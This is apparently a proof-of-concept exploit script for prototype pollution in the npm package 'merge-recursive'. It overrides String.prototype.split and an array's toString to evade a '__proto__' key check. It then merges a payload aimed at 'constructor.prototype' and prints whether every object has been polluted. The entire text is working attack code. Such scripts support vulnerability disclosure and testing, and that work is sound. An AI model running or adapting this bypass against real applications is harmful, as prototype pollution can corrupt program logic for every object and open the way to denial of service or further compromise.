var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const merge = require('merge-recursive').recursive;
const malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);